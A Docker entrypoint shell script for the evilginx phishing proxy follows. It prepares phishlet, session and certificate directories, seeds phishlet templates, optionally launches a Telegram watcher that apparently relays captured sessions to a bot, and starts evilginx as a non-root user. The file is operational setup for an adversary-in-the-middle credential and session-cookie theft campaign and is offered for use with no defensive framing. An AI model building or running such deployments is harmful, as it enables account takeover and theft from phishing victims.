#!/bin/sh
# entrypoint.sh for evilginx (v4.0.0) docker image
set -e

APP_DIR=/app
EG_HOME=/home/evilginx/.evilginx
SEED_PHISHLETS=/usr/local/share/evilginx/phishlets

# 1. Ensure data directories exist
mkdir -p "$APP_DIR/phishlets" "$APP_DIR/sessions" "$APP_DIR/certs" "$EG_HOME"

# 2. Seed the persistent phishlets volume on FIRST run only
if [ -d "$SEED_PHISHLETS" ] && [ -z "$(ls -A "$APP_DIR/phishlets" 2>/dev/null)" ]; then
    echo "[entrypoint] Seeding phishlets into $APP_DIR/phishlets ..."
    cp -r "$SEED_PHISHLETS"/. "$APP_DIR/phishlets"/
fi

# 3. Start Telegram watcher (optional - needs TG_BOT_TOKEN + TG_CHAT_ID)
if [ -n "$TG_BOT_TOKEN" ] && [ -n "$TG_CHAT_ID" ]; then
    echo "[entrypoint] Telegram notifications enabled."
    setsid /usr/local/bin/telegram-watch.sh >/dev/null 2>&1 &
fi

# 4. Fix ownership of ALL mounted volumes, drop to non-root, run evilginx
if [ "$(id -u)" = "0" ]; then
    chown -R evilginx:evilginx "$APP_DIR" "$EG_HOME" /home/evilginx 2>/dev/null || true
    exec su-exec evilginx:evilginx /usr/local/bin/evilginx -p "$APP_DIR/phishlets" "$@"
fi

exec /usr/local/bin/evilginx -p "$APP_DIR/phishlets" "$@"
